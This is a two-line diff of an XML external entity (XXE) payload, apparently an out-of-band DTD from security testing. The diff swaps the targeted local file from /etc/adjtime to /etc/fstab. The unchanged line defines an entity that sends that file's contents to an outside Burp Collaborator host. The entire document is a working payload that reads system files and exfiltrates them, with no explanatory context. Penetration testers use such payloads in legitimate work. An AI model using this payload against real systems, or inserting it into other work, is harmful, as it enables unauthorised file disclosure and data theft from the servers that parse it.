@@ -1,2 +1,2 @@
-<!ENTITY % payl SYSTEM "file:///etc/adjtime">
+<!ENTITY % payl SYSTEM "file:///etc/fstab">
 <!ENTITY % intern "<!ENTITY &#x25; xxe SYSTEM 'http://8foc3far2hpzmmwj7fb0ykyt9kfd32.burpcollaborator.net/r?%payl;'>">
